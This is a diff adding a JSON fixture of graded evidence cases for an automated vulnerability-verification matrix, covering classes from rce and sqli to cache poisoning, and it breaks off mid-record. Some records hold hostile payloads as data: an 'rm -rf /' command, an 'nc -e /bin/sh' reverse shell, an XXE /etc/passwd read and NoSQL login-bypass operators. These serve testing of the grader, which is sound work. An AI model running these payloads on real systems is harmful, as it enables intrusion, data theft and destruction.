@@ -1,0 +1,1443 @@
+{
+  "version": 1,
+  "note": "Each case is one evidence set and the grade the matrix must give it. The `must_not_be_proven` cases are the important half: they are the shapes an automated tester mistakes for a finding, and every one of them was an actual mistake somewhere before it was a test case here. The rce cases carrying a reflected token exist because two independent reviewers reproduced the same failure end to end: http.probe writes the caller's token into the evidence record's nonce field, so a parameter that merely reflects it satisfied 'a nonce exists' and the class graded proven with nothing executed.",
+  "cases": [
+    {
+      "name": "rce: nonce echoed with an identity line",
+      "vuln_class": "rce",
+      "expect": "proven",
+      "records": [
+        {
+          "id": "e1",
+          "nonce": "argustest01",
+          "command": [
+            "id; echo argustest01"
+          ],
+          "stdout_span": "uid=33(www-data) gid=33(www-data)\nargustest01"
+        }
+      ]
+    },
+    {
+      "name": "rce: an identity line alone is a real partial signal, and names the two checks it is missing",
+      "vuln_class": "rce",
+      "expect": "supported",
+      "records": [
+        {
+          "id": "e2",
+          "nonce": "argustest02",
+          "stdout_span": "uid=0(root) gid=0(root)"
+        }
+      ]
+    },
+    {
+      "name": "rce: a destructive payload is vetoed, not merely short of a check",
+      "vuln_class": "rce",
+      "expect": "unproven",
+      "records": [
+        {
+          "id": "e3",
+          "nonce": "argustest03",
+          "command": [
+            "curl",
+            "http://t/?c=rm -rf /"
+          ],
+          "stdout_span": "argustest03"
+        }
+      ]
+    },
+    {
+      "name": "rce: no evidence at all",
+      "vuln_class": "rce",
+      "expect": "unproven",
+      "records": []
+    },
+    {
+      "name": "sqli: fingerprint, named table, rows",
+      "vuln_class": "sqli",
+      "expect": "proven",
+      "records": [
+        {
+          "id": "e4",
+          "extracted": {
+            "dbms": "MariaDB 10.5",
+            "table": "users",
+            "rows": [
+              [
+                "1",
+                "admin"
+              ]
+            ],
+            "row_count": 1
+          }
+        }
+      ]
+    },
+    {
+      "name": "sqli: a 500 on a quote is not a proof",
+      "vuln_class": "sqli",
+      "expect": "unproven",
+      "records": [
+        {
+          "id": "e5",
+          "response": {
+            "status": 500,
+            "body_span": "SQL syntax error near '"
+          }
+        }
+      ]
+    },
+    {
+      "name": "sqli: a dump larger than the proof fails the hygiene check",
+      "vuln_class": "sqli",
+      "expect": "proven_with_hygiene_failure",
+      "records": [
+        {
+          "id": "e6",
+          "extracted": {
+            "dbms": "MySQL 8",
+            "table": "users",
+            "rows": [
+              [
+                "1"
+              ],
+              [
+                "2"
+              ],
+              [
+                "3"
+              ],
+              [
+                "4"
+              ],
+              [
+                "5"
+              ],
+              [
+                "6"
+              ]
+            ],
+            "row_count": 6
+          }
+        }
+      ]
+    },
+    {
+      "name": "lfi: sentinel plus control",
+      "vuln_class": "lfi",
+      "expect": "proven",
+      "records": [
+        {
+          "id": "e7",
+          "response": {
+            "status": 200,
+            "body_span": "root:x:0:0:root:/root:/bin/sh"
+          }
+        },
+        {
+          "id": "e8",
+          "kind": "control",
+          "is_control": true,
+          "response": {
+            "status": 404,
+            "body_span": "not found"
+          }
+        }
+      ]
+    },
+    {
+      "name": "lfi: sentinel without a control",
+      "vuln_class": "lfi",
+      "expect": "supported",
+      "records": [
+        {
+          "id": "e9",
+          "response": {
+            "status": 200,
+            "body_span": "root:x:0:0:root:/root:/bin/sh"
+          }
+        }
+      ]
+    },
+    {
+      "name": "xss: reflection in a script string is not execution",
+      "vuln_class": "xss",
+      "expect": "supported",
+      "records": [
+        {
+          "id": "e10",
+          "reflected_context": "script-string",
+          "nonce": "argustest10"
+        }
+      ]
+    },
+    {
+      "name": "xss: a browser executed it",
+      "vuln_class": "xss",
+      "expect": "proven",
+      "records": [
+        {
+          "id": "e11",
+          "reflected_context": "script-string",
+          "nonce": "argustest11"
+        },
+        {
+          "id": "e12",
+          "kind": "browser",
+          "executed": true,
+          "nonce": "argustest11",
+          "extracted": {
+            "console": [
+              "argustest11"
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "name": "ssti: result present, expression absent",
+      "vuln_class": "ssti",
+      "expect": "proven",
+      "records": [
+        {
+          "id": "e13",
+          "payload": "{{ 1361*9973 }}",
+          "extracted": {
+            "expected_result": "13573253"
+          },
+          "response": {
+            "status": 200,
+            "body_span": "result: 13573253"
+          }
+        }
+      ]
+    },
+    {
+      "name": "ssti: the expression was echoed back verbatim",
+      "vuln_class": "ssti",
+      "expect": "unproven",
+      "records": [
+        {
+          "id": "e14",
+          "payload": "{{ 1361*9973 }}",
+          "extracted": {
+            "expected_result": "13573253"
+          },
+          "response": {
+            "status": 200,
+            "body_span": "you searched for {{ 1361*9973 }}"
+          }
+        }
+      ]
+    },
+    {
+      "name": "idor: cross-read with its control",
+      "vuln_class": "idor",
+      "expect": "proven",
+      "records": [
+        {
+          "id": "e15",
+          "actor": "alice",
+          "accessed_subject": "admin",
+          "response": {
+            "status": 200,
+            "body_span": "{\"owner\":\"admin\"}"
+          }
+        },
+        {
+          "id": "e16",
+          "kind": "control",
+          "is_control": true,
+          "actor": "alice",
+          "response": {
+            "status": 404,
+            "body_span": "not found"
+          }
+        }
+      ]
+    },
+    {
+      "name": "idor: a 200 with no owner and no control",
+      "vuln_class": "idor",
+      "expect": "unproven",
+      "records": [
+        {
+          "id": "e17",
+          "response": {
+            "status": 200,
+            "body_span": "ok"
+          }
+        }
+      ]
+    },
+    {
+      "name": "ssrf: a collector callback carrying the probe token",
+      "vuln_class": "ssrf",
+      "expect": "proven",
+      "records": [
+        {
+          "id": "e18",
+          "nonce": "argustest18"
+        },
+        {
+          "id": "e19",
+          "kind": "oob",
+          "nonce": "argustest18",
+          "source_ip": "10.0.0.5",
+          "callback_payload": "GET /argustest18"
+        }
+      ]
+    },
+    {
+      "name": "ssrf: no callback is not a proof",
+      "vuln_class": "ssrf",
+      "expect": "supported",
+      "records": [
+        {
+          "id": "e20",
+          "nonce": "argustest20"
+        }
+      ]
+    },
+    {
+      "name": "auth-bypass: forged accepted, invalid rejected, privileged content",
+      "vuln_class": "auth-bypass",
+      "expect": "proven",
+      "records": [
+        {
+          "id": "e21",
+          "token_accepted": true,
+          "privileged_marker": "role=admin",
+          "response": {
+            "status": 200,
+            "body_span": "role=admin"
+          }
+        },
+        {
+          "id": "e22",
+          "token_accepted": false,
+          "response": {
+            "status": 401,
+            "body_span": "invalid"
+          }
+        }
+      ]
+    },
+    {
+      "name": "auth-bypass: accepted with no invalid control, so the endpoint may need no token",
+      "vuln_class": "auth-bypass",
+      "expect": "supported",
+      "records": [
+        {
+          "id": "e23",
+          "token_accepted": true,
+          "privileged_marker": "role=admin"
+        }
+      ]
+    },
+    {
+      "name": "secret-exposure: a key in a bundle, not validated",
+      "vuln_class": "secret-exposure",
+      "expect": "supported",
+      "records": [
+        {
+          "id": "e24",
+          "extracted": {
+            "secret_kind": "aws-access-key",
+            "secret_value": "AKIA…REDACTED"
+          }
+        }
+      ]
+    },
+    {
+      "name": "dos: refused by construction",
+      "vuln_class": "dos",
+      "expect": "refused",
+      "records": [
+        {
+          "id": "e25",
+          "response": {
+            "status": 503,
+            "body_span": "gateway timeout"
+          }
+        }
+      ]
+    },
+    {
+      "name": "an unknown class cannot be graded",
+      "vuln_class": "telepathy",
+      "expect": "unproven",
+      "records": [
+        {
+          "id": "e26",
+          "response": {
+            "status": 200,
+            "body_span": "anything"
+          }
+        }
+      ]
+    },
+    {
+      "name": "nuclei-match is a candidate, never a class",
+      "vuln_class": "nuclei-match",
+      "expect": "unproven",
+      "records": [
+        {
+          "id": "e27",
+          "extracted": {
+            "template": "CVE-2021-41773"
+          }
+        }
+      ]
+    },
+    {
+      "name": "rce: a reflected token is not execution (the failure two reviewers found)",
+      "vuln_class": "rce",
+      "expect": "unproven",
+      "records": [
+        {
+          "id": "r1",
+          "nonce": "argusreflect12",
+          "response": {
+            "status": 200,
+            "body_span": "No results for id; echo argusreflect12"
+          }
+        }
+      ]
+    },
+    {
+      "name": "rce: a nonce echoed with no command declared and no identity line",
+      "vuln_class": "rce",
+      "expect": "unproven",
+      "records": [
+        {
+          "id": "r2",
+          "nonce": "argusreflect13",
+          "stdout_span": "argusreflect13"
+        }
+      ]
+    },
+    {
+      "name": "rce: any record at all under an rce hypothesis must not be a candidate",
+      "vuln_class": "rce",
+      "expect": "unproven",
+      "records": [
+        {
+          "id": "r3",
+          "kind": "probe",
+          "response": {
+            "status": 200,
+            "body_span": "hello"
+          }
+        }
+      ]
+    },
+    {
+      "name": "rce: a destructive payload is vetoed even when the nonce and identity are present",
+      "vuln_class": "rce",
+      "expect": "unproven",
+      "records": [
+        {
+          "id": "r4",
+          "nonce": "argusdestr1",
+          "command": [
+            "curl",
+            "http://t/?c=rm -rf /"
+          ],
+          "stdout_span": "uid=0(root) gid=0(root)\nargusdestr1"
+        }
+      ]
+    },
+    {
+      "name": "rce: the real shape — command declared, nonce echoed, identity line",
+      "vuln_class": "rce",
+      "expect": "proven",
+      "records": [
+        {
+          "id": "r5",
+          "nonce": "argusreal01",
+          "command": [
+            "id; echo argusreal01"
+          ],
+          "stdout_span": "uid=33(www-data) gid=33(www-data)\nargusreal01"
+        }
+      ]
+    },
+    {
+      "name": "secret-exposure: a record with no secret in it is not a candidate",
+      "vuln_class": "secret-exposure",
+      "expect": "unproven",
+      "records": [
+        {
+          "id": "r6",
+          "kind": "probe",
+          "response": {
+            "status": 200,
+            "body_span": "ok"
+          }
+        }
+      ]
+    },
+    {
+      "name": "idor: a control that answers the same as the probe proves nothing",
+      "vuln_class": "idor",
+      "expect": "supported",
+      "records": [
+        {
+          "id": "r7",
+          "actor": "alice",
+          "accessed_subject": "admin",
+          "response": {
+            "status": 200,
+            "body_span": "{\"owner\":\"admin\"}"
+          }
+        },
+        {
+          "id": "r8",
+          "kind": "control",
+          "is_control": true,
+          "actor": "alice",
+          "response": {
+            "status": 200,
+            "body_span": "{\"ok\":true}"
+          }
+        }
+      ]
+    },
+    {
+      "name": "deserialization: inherits the rce shape, including the veto",
+      "vuln_class": "deserialization",
+      "expect": "unproven",
+      "records": [
+        {
+          "id": "r9",
+          "nonce": "argusdeser1",
+          "command": [
+            "nc -e /bin/sh 10.0.0.1 4444"
+          ],
+          "stdout_span": "uid=0(root)\nargusdeser1"
+        }
+      ]
+    },
+    {
+      "name": "idor: the four-record set session.compare_as emits grades proven",
+      "vuln_class": "idor",
+      "expect": "proven",
+      "records": [
+        {
+          "id": "s1",
+          "kind": "probe",
+          "tool": "session.compare_as",
+          "actor": "alice",
+          "accessed_subject": "admin",
+          "response": {
+            "status": 200,
+            "body_span": "{\"id\": 2, \"owner\": \"admin\", \"body\": \"private\"}"
+          },
+          "extracted": {
+            "entitlement": "not-entitled",
+            "declared_not_entitled": [
+              "admin"
+            ]
+          }
+        },
+        {
+          "id": "s2",
+          "kind": "probe",
+          "tool": "session.compare_as",
+          "actor": "admin",
+          "accessed_subject": "admin",
+          "response": {
+            "status": 200,
+            "body_span": "{\"id\": 2, \"owner\": \"admin\", \"body\": \"private\"}"
+          }
+        },
+        {
+          "id": "s3",
+          "kind": "control",
+          "is_control": true,
+          "tool": "session.compare_as",
+          "actor": "unauthenticated",
+          "accessed_subject": "admin",
+          "response": {
+            "status": 401,
+            "body_span": "{\"error\": \"unauthenticated\"}"
+          }
+        },
+        {
+          "id": "s4",
+          "kind": "control",
+          "is_control": true,
+          "tool": "session.compare_as",
+          "actor": "alice",
+          "accessed_subject": "alice",
+          "response": {
+            "status": 200,
+            "body_span": "{\"id\": 1, \"owner\": \"alice\", \"body\": \"shopping list\"}"
+          }
+        }
+      ]
+    },
+    {
+      "name": "idor: a cross-read with no control proves nothing about entitlement",
+      "vuln_class": "idor",
+      "expect": "supported",
+      "records": [
+        {
+          "id": "s5",
+          "kind": "probe",
+          "actor": "alice",
+          "accessed_subject": "admin",
+          "response": {
+            "status": 200,
+            "body_span": "{\"id\": 2, \"owner\": \"admin\"}"
+          }
+        }
+      ]
+    },
+    {
+      "name": "idor: two identities, but no record names whose data was read",
+      "vuln_class": "idor",
+      "expect": "unproven",
+      "records": [
+        {
+          "id": "s6",
+          "kind": "probe",
+          "actor": "alice",
+          "response": {
+            "status": 200,
+            "body_span": "{\"id\": 2}"
+          }
+        },
+        {
+          "id": "s7",
+          "kind": "probe",
+          "actor": "admin",
+          "response": {
+            "status": 200,
+            "body_span": "{\"id\": 2}"
+          }
+        },
+        {
+          "id": "s8",
+          "kind": "control",
+          "is_control": true,
+          "actor": "unauthenticated",
+          "response": {
+            "status": 401,
+            "body_span": "{\"error\": \"unauthenticated\"}"
+          }
+        }
+      ],
+      "note": "the floor check for this class was added during integration: a record set that carries only the control is not partial progress on the finding, so the grade is `unproven` rather than `supported`. The case name already said as much."
+    },
+    {
+      "name": "idor: one identity reading its own record is not a cross-read",
+      "vuln_class": "idor",
+      "expect": "unproven",
+      "records": [
+        {
+          "id": "s9",
+          "kind": "probe",
+          "actor": "alice",
+          "accessed_subject": "alice",
+          "response": {
+            "status": 200,
+            "body_span": "{\"id\": 1, \"owner\": \"alice\"}"
+          }
+        }
+      ]
+    },
+    {
+      "name": "auth-bypass: accepted and rejected, but no privileged content, so no privilege gain is shown",
+      "vuln_class": "auth-bypass",
+      "expect": "supported",
+      "records": [
+        {
+          "id": "ab1",
+          "token_accepted": true,
+          "payload": "alg set to none and the signature removed",
+          "response": {
+            "status": 200,
+            "body_span": "{\"ok\":true}"
+          }
+        },
+        {
+          "id": "ab2",
+          "kind": "control",
+          "is_control": true,
+          "token_accepted": false,
+          "payload": "a deliberately invalid token, as the control",
+          "response": {
+            "status": 401,
+            "body_span": "{\"error\":\"unauthorised\"}"
+          }
+        }
+      ]
+    },
+    {
+      "name": "secret-exposure: a key observed, validated against its issuer, stored redacted",
+      "vuln_class": "secret-exposure",
+      "expect": "proven",
+      "records": [
+        {
+          "id": "se1",
+          "target": "https://t/static/app.4f1c.js",
+          "extracted": {
+            "secret_kind": "aws-access-key",
+            "secret_value": "AKIA…REDACTED",
+            "location": "app.4f1c.js offset 81422",
+            "validated": true,
+            "issuer_response": "sts get-caller-identity 200, principal named"
+          }
+        }
+      ]
+    },
+    {
+      "name": "secret-exposure: validated, but the whole key was written into the ledger",
+      "vuln_class": "secret-exposure",
+      "expect": "supported",
+      "records": [
+        {
+          "id": "se2",
+          "extracted": {
+            "secret_kind": "aws-access-key",
+            "validated": true,
+            "secret_value": "AKIAIOSFODNN7EXAMPLE"
+          }
+        }
+      ]
+    },
+    {
+      "name": "race-condition: parallel burst with the serial control that refused",
+      "vuln_class": "race-condition",
+      "expect": "proven",
+      "records": [
+        {
+          "id": "rc1",
+          "ordering": "parallel-20",
+          "target": "https://t/api/coupon/redeem",
+          "extracted": {
+            "sent": 20,
+            "accepted": 3,
+            "state_after": "credit applied 3x for one coupon"
+          },
+          "response": {
+            "status": 200,
+            "body_span": "{\"redeemed\":true}"
+          }
+        },
+        {
+          "id": "rc2",
+          "kind": "control",
+          "is_control": true,
+          "ordering": "serial-20",
+          "extracted": {
+            "sent": 20,
+            "accepted": 1,
+            "refused": 19
+          },
+          "response": {
+            "status": 409,
+            "body_span": "coupon already redeemed"
+          }
+        }
+      ]
+    },
+    {
+      "name": "race-condition: a burst that worked once, with no serial control to make it impossible",
+      "vuln_class": "race-condition",
+      "expect": "supported",
+      "records": [
+        {
+          "id": "rc3",
+          "ordering": "parallel-20",
+          "extracted": {
+            "sent": 20,
+            "accepted": 2
+          },
+          "response": {
+            "status": 200,
+            "body_span": "{\"redeemed\":true}"
+          }
+        },
+        {
+          "id": "rc4",
+          "ordering": "parallel-20",
+          "extracted": {
+            "sent": 20,
+            "accepted": 1
+          },
+          "response": {
+            "status": 409,
+            "body_span": "coupon already redeemed"
+          }
+        }
+      ]
+    },
+    {
+      "name": "race-condition: the application answers 200 to the refusal too, so no outcome differs",
+      "vuln_class": "race-condition",
+      "expect": "unproven",
+      "records": [
+        {
+          "id": "rc5",
+          "ordering": "parallel-20",
+          "extracted": {
+            "sent": 20,
+            "accepted": 3
+          },
+          "response": {
+            "status": 200,
+            "body_span": "{\"redeemed\":true}"
+          }
+        },
+        {
+          "id": "rc6",
+          "kind": "control",
+          "is_control": true,
+          "ordering": "serial-20",
+          "extracted": {
+            "sent": 20,
+            "accepted": 1,
+            "refused": 19
+          },
+          "response": {
+            "status": 200,
+            "body_span": "{\"error\":\"already redeemed\"}"
+          }
+        }
+      ],
+      "note": "the floor check for this class was added during integration: a record set that carries only the control is not partial progress on the finding, so the grade is `unproven` rather than `supported`. The case name already said as much."
+    },
+    {
+      "name": "xxe: /etc/passwd read through the entity, with the control",
+      "vuln_class": "xxe",
+      "expect": "proven",
+      "records": [
+        {
+          "id": "e40",
+          "tool": "proof.file_read",
+          "payload": "<!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>",
+          "response": {
+            "status": 200,
+            "body_span": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin"
+          }
+        },
+        {
+          "id": "e41",
+          "kind": "control",
+          "is_control": true,
+          "payload": "file:///etc/argustest40-does-not-exist",
+          "response": {
+            "status": 500,
+            "body_span": "failed to load external entity"
+          }
+        }
+      ]
+    },
+    {
+      "name": "xxe: a collector hit for the external DTD, carrying no file content - that is ssrf, not a file read",
+      "vuln_class": "xxe",
+      "expect": "unproven",
+      "records": [
+        {
+          "id": "e42",
+          "nonce": "argustest42",
+          "payload": "<!ENTITY % d SYSTEM \"http://collector/argustest42.dtd\"> %d;"
+        },
+        {
+          "id": "e43",
+          "kind": "oob",
+          "nonce": "argustest42",
+          "source_ip": "10.0.0.9",
+          "callback_payload": "{\"path\": \"/argustest42.dtd\", \"method\": \"GET\"}"
+        }
+      ]
+    },
+    {
+      "name": "deserialization: the marker command's nonce came back through the gadget",
+      "vuln_class": "deserialization",
+      "expect": "proven",
+      "records": [
+        {
+          "id": "e44",
+          "nonce": "argustest44",
+          "command": [
+            "id; echo argustest44"
+          ],
+          "payload": "rO0ABXNy...",
+          "stdout_span": "uid=33(www-data) gid=33(www-data) groups=33(www-data)\nargustest44"
+        }
+      ]
+    },
+    {
+      "name": "nosqli: one document from a named collection, with no engine banner anywhere",
+      "vuln_class": "nosqli",
+      "expect": "proven",
+      "records": [
+        {
+          "id": "e46",
+          "payload": "{\"user\":\"admin\",\"pass\":{\"$ne\":\"\"}}",
+          "extracted": {
+            "table": "users",
+            "row_count": 1,
+            "rows": [
+              {
+                "_id": "64b7f0c2a1",
+                "user": "admin",
+                "role": "superuser"
+              }
+            ]
+          },
+          "response": {
+            "status": 200,
+            "body_span": "{\"_id\":\"64b7f0c2a1\",\"user\":\"admin\",\"role\":\"superuser\"}"
+          }
+        }
+      ]
+    },
+    {
+      "name": "nosqli: documents came back but no collection is named, so there is nothing to report",
+      "vuln_class": "nosqli",
+      "expect": "unproven",
+      "records": [
+        {
+          "id": "e47",
+          "payload": "{\"user\":{\"$ne\":\"\"}}",
+          "extracted": {
+            "row_count": 1,
+            "rows": [
+              {
+                "_id": "64b7f0c2a1"
+              }
+            ]
+          },
+          "response": {
+            "status": 200,
+            "body_span": "[{\"_id\":\"64b7f0c2a1\"}]"
+          }
+        }
+      ]
+    },
+    {
+      "name": "nosqli: proven, but the extraction went past the proof",
+      "vuln_class": "nosqli",
+      "expect": "proven_with_hygiene_failure",
+      "records": [
+        {
+          "id": "e48",
+          "payload": "{\"user\":{\"$regex\":\"\"}}",
+          "extracted": {
+            "table": "users",
+            "row_count": 6,
+            "rows": [
+              {
+                "u": "a"
+              },
+              {
+                "u": "b"
+              },
+              {
+                "u": "c"
+              },
+              {
+                "u": "d"
+              },
+              {
+                "u": "e"
+              },
+              {
+                "u": "f"
+              }
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "name": "race-condition: two orderings, the serial control, and an outcome serial never reached",
+      "vuln_class": "race-condition",
+      "expect": "proven",
+      "records": [
+        {
+          "id": "ev-w01",
+          "ordering": "parallel",
+          "extracted": {
+            "count": 10,
+            "distribution": {
+              "200": 2,
+              "409": 8
+            },
+            "marker_hits": 2,
+            "surplus_successes": 1,
+            "divergence_rank": 1,
+            "window_ms": 12.4,
+            "state_reset_ok": true
+          },
+          "response": {
+            "status": 200,
+            "body_span": "{\"ok\": true, \"left\": 0}"
+          }
+        },
+        {
+          "id": "ev-w02",
+          "kind": "control",
+          "is_control": true,
+          "ordering": "serial",
+          "extracted": {
+            "count": 10,
+            "distribution": {
+              "200": 1,
+              "409": 9
+            },
+            "marker_hits": 1,
+            "purpose": "what the same N requests do when they cannot overlap"
+          },
+          "response": {
+            "status": 409,
+            "body_span": "{\"error\": \"sold out\"}"
+          }
+        }
+      ]
+    },
+    {
+      "name": "race-condition: a flaky endpoint is not a race - both orderings reached the same outcomes",
+      "vuln_class": "race-condition",
+      "expect": "unproven",
+      "records": [
+        {
+          "id": "ev-w03",
+          "ordering": "parallel",
+          "extracted": {
+            "count": 10,
+            "distribution": {
+              "200": 1,
+              "409": 9
+            },
+            "marker_hits": 1,
+            "surplus_successes": 0,
+            "divergence_rank": null
+          },
+          "response": {
+            "status": 200,
+            "body_span": "{\"ok\": true, \"left\": 0}"
+          }
+        },
+        {
+          "id": "ev-w04",
+          "kind": "control",
+          "is_control": true,
+          "ordering": "serial",
+          "extracted": {
+            "count": 10,
+            "distribution": {
+              "200": 1,
+              "409": 9
+            },
+            "marker_hits": 1
+          },
+          "response": {
+            "status": 200,
+            "body_span": "{\"ok\": true, \"left\": 0}"
+          }
+        }
+      ],
+      "note": "the floor check for this class was added during integration: a record set that carries only the control is not partial progress on the finding, so the grade is `unproven` rather than `supported`. The case name already said as much."
+    },
+    {
+      "name": "race-condition: a parallel burst with no serial control proves nothing",
+      "vuln_class": "race-condition",
+      "expect": "unproven",
+      "records": [
+        {
+          "id": "ev-w05",
+          "ordering": "parallel",
+          "extracted": {
+            "count": 20,
+            "distribution": {
+              "200": 20
+            }
+          },
+          "response": {
+            "status": 200,
+            "body_span": "{\"ok\": true}"
+          }
+        }
+      ]
+    },
+    {
+      "name": "cache-poisoning: an unkeyed header reached a clean requester, with the clean control",
+      "vuln_class": "cache-poisoning",
+      "expect": "proven",
+      "records": [
+        {
+          "id": "ev-w06",
+          "kind": "control",
+          "is_control": true,
+          "ordering": "clean-requester-before",
+          "extracted": {
+            "purpose": "a separate cache entry, fetched clean",
+            "cache_entry": "https://t/page?argus-cb=argustest20-control",
+            "cache_headers": {
+              "x-cache": "MISS",
+              "age": "0"
+            }
+          },
+          "response": {
+            "status": 200,
+            "body_span": "<html>widgets</html>"
+          }
+        },
+        {
+          "id": "ev-w07",
+          "ordering": "clean-requester-after",
+          "nonce": "argustest20",
+          "extracted": {
+            "unkeyed_header": "X-Original-URL",
+            "unkeyed_value": "/argustest20-no-such-path",
+            "nonce_in_clean_response": true,
+            "clean_response_changed": true,
+            "cache_headers": {
+              "x-cache": "HIT",
+              "age": "7"
+            }
+          },
+          "response": {
+            "status": 404,
+            "body_span": "<html>no such page: /argustest20-no-such-path</html>"
+          }
+        },
+        {
+          "id": "ev-w08",
+          "ordering": "poisoning-requester",
+          "nonce": "argustest20",
+          "payload": "X-Original-URL: /argustest20-no-such-path",
+          "extracted": {
+            "purpose": "the request that put the value into the cache entry",
+            "cache_headers": {
+              "x-cache": "MISS"
+            }
+          },
+          "response": {
+            "status": 404,
+            "body_span": "<html>no such page</html>"
+          }
+        }
+      ]
+    },
+    {
+      "name": "cache-poisoning: the nonce never reached a clean requester, so nothing was poisoned",
+      "vuln_class": "cache-poisoning",
+      "expect": "unproven",
+      "records": [
+        {
+          "id": "ev-w09",
+          "kind": "control",
+          "is_control": true,
+          "ordering": "clean-requester-before",
+          "extracted": {
+            "cache_headers": {}
+          },
+          "response": {
+            "status": 200,
+            "body_span": "<html>widgets</html>"
+          }
+        },
+        {
+          "id": "ev-w10",
+          "ordering": "clean-requester-after",
+          "nonce": "argustest21",
+          "extracted": {
+            "unkeyed_header": "X-Forwarded-Host",
+            "unkeyed_value": "argustest21.test",
+            "nonce_in_clean_response": false,
+            "clean_response_changed": false,
+            "cache_headers": {}
+          },
+          "response": {
+            "status": 200,
+            "body_span": "<html>widgets</html>"
+          }
+        }
+      ],
+      "note": "the floor check for this class was added during integration: a record set that carries only the control is not partial progress on the finding, so the grade is `unproven` rather than `supported`. The case name already said as much."
+    },
+    {
+      "name": "open-redirect: an off-origin Location where the endpoint with no destination does not redirect",
+      "vuln_class": "open-redirect",
+      "expect": "proven",
+      "records": [
+        {
+          "id": "ev-w11",
+          "payload": "//argus-redirect-argustest22.invalid/argus",
+          "extracted": {
+            "shape": "scheme-relative",
+            "location": "//argus-redirect-argustest22.invalid/argus",
+            "location_present": true,
+            "off_origin_location": "https://argus-redirect-argustest22.invalid",
+            "off_origin_via": [
+              "strict",
+              "browser"
+            ],
+            "request_origin": "https://t"
+          },
+          "response": {
+            "status": 302,
+            "headers": {
+              "location": "//argus-redirect-argustest22.invalid/argus"
+            },
+            "body_span": ""
+          }
+        },
+        {
+          "id": "ev-w12",
+          "kind": "control",
+          "is_control": true,
+          "payload": "/robots.txt",
+          "extracted": {
+            "purpose": "an in-origin destination: the parameter is honoured",
+            "location": "/robots.txt",
+            "off_origin_location": null,
+            "off_origin_via": []
+          },
+          "response": {
+            "status": 302,
+            "headers": {
+              "location": "/robots.txt"
+            },
+            "body_span": ""
+          }
+        },
+        {
+          "id": "ev-w13",
+          "kind": "control",
+          "is_control": true,
+          "extracted": {
+            "purpose": "the same endpoint with no destination parameter at all",
+            "location": null
+          },
+          "response": {
+            "status": 200,
+            "body_span": "<html>where to?</html>"
+          }
+        }
+      ]
+    },
+    {
+      "name": "open-redirect: the destination was validated - every shape stayed in origin",
+      "vuln_class": "open-redirect",
+      "expect": "unproven",
+      "records": [
+        {
+          "id": "ev-w14",
+          "payload": "https://argus-redirect-argustest23.invalid/argus",
+          "extracted": {
+            "shape": "absolute",
+            "location": "/login?error=bad-destination",
+            "location_present": true,
+            "off_origin_location": null,
+            "off_origin_via": [],
+            "request_origin": "https://t"
+          },
+          "response": {
+            "status": 302,
+            "headers": {
+              "location": "/login?error=bad-destination"
+            },
+            "body_span": ""
+          }
+        },
+        {
+          "id": "ev-w15",
+          "kind": "control",
+          "is_control": true,
+          "payload": "/robots.txt",
+          "extracted": {
+            "purpose": "an in-origin destination",
+            "location": "/robots.txt",
+            "off_origin_location": null,
+            "off_origin_via": []
+          },
+          "response": {
+            "status": 302,
+            "headers": {
+              "location": "/robots.txt"
+            },
+            "body_span": ""
+          }
+        }
+      ]
+    },
+    {
+      "name": "graphql-exposure: documents from a named collection, bounded to five",
+      "vuln_class": "graphql-exposure",
+      "expect": "proven",
+      "records": [
+        {
+          "id": "ev-w16",
+          "payload": "query{users{id email}}",
+          "extracted": {
+            "table": "users",
+            "rows": [
+              {
+                "id": 1,
+                "email": "admin@widgets.test"
+              },
+              {
+                "id": 2,
+                "email": "alice@widgets.test"
+              }
+            ],
+            "row_count": 2,
+            "rows_kept": 2,
+            "graphql_errors": []
+          },
+          "response": {
+            "status": 200,
+            "body_span": "{\"data\": {\"users\": [{\"id\": 1}]}}"
+          }
+        }
+      ]
+    },
+    {
+      "name": "graphql-exposure: an introspection dump is an inventory, not a document read",
+      "vuln_class": "graphql-exposure",
+      "expect": "unproven",
+      "records": [
+        {
+          "id": "ev-w17",
+          "payload": "query{__schema{types{name fields{name}}}}",
+          "extracted": {
+            "introspection_enabled": true,
+            "inventory": {
+              "query_type": "Query",
+              "type_count": 42
+            },
+            "interesting_fields": [
+              "Query.users",
+              "User.email",
+              "User.passwordHash"
+            ]
+          },
+          "response": {
+            "status": 200,
+            "body_span": "{\"data\": {\"__schema\": {\"types\": []}}}"
+          }
+        },
+        {
+          "id": "ev-w18",
+          "payload": "[3 x query{__typename}]",
+          "extracted": {
+            "batching_enabled": true,
+            "batch_size": 3
+          },
+          "response": {
+            "status": 200,
+            "body_span": "[{},{},{}]"
+          }
+        }
+      ]
+    },
+    {
+      "name": "file-upload-rce: the uploaded path ran the marker command",
+      "vuln_class": "file-upload-rce",
+      "expect": "proven",
+      "records": [
+        {
+          "id": "ev-w20",
+          "payload": "POST https://t/upload <- argus-argustest25.php (112B inert)",
+          "extracted": {
+            "upload_token": "argustest25",
+            "filename": "argus-argustest25.php",
+            "accepted": true,
+            "content_inert": true,
+            "served": true,
+            "stored_path": "https://t/files/argus-argustest25.php"
+          },
+          "response": {
+            "status": 201,
+            "body_span": "{\"stored\": \"/files/argus-argustest25.php\"}"
+          }
+        },
+        {
+          "id": "ev-w21",
+          "nonce": "argustest26",
+          "command": [
+            "id; echo argustest26"
+          ],
+          "stdout_span": "uid=33(www-data) gid=33(www-data) groups=33(www-data)\nargustest26",
+          "response": {
+            "status": 200,
+            "body_span": "uid=33(www-data) gid=33(www-data)\nargustest26"
+          }
+        }
+      ]
+    },
+    {
+      "name": "secret-exposure: a bundle-mining record names kinds for the index and carries no secret value, so it is unproven, not partial",
+      "vuln_class": "secret-exposure",
+      "expect": "unproven",
+      "records": [
+        {
+          "id": "se3",
+          "tool": "recon.js_mine",
+          "target": "https://t/",
+          "extracted": {
+            "endpoint_count": 5,
+            "secret_kinds": [
+              "aws-access-key"
+            ]
+          }
+        }
+      ],
+      "note": "the builder expected `supported`; the matrix was tightened during integration so that a hygiene check which passes trivially cannot carry a grade, and this shape is now `unproven`. Kept because the shape is real and worth pinning."
+    },
+    {
+      "name": "deserialization: the parameter reaches a deserializer but no gadget ran - unproven, because the class is proven by execution or not at all",
+      "vuln_class": "deserialization",
+      "expect": "unproven",
+      "records": [
+        {
+          "id": "e45",
+          "payload": "rO0ABXNyABNqYXZhLnV0aWwuSGFzaE1hcA==",
+          "response": {
+            "status": 500,
